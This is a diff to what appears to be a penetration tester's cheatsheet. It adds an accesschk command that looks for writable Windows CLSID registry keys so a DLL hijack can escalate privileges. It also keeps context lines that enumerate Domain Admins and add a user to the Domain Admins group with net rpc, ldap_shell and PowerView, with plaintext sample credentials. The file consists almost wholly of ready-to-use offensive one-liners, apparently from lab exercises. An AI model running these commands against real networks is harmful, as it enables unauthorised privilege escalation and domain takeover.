@@ -1,5 +1,6 @@
 # CHEATSHEETS
 
+./accesschk.exe -accepteula -kuwq "RUSTYKEY\Support" HKCR\CLSID | findstr /I "RW"	# Privesc Windows | find DLL hijack
 net rpc group members "Domain Admins" -U ignite.local/shreya%'Password@1' -S 192.168.1.48		# List users in Group
 ldap_shell ignite.local/shreya:Password@1 -dc-ip 192.168.1.48		# AddSelf	# add_user_to_group <user> <Group>
 Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose	# Addself # PowerView
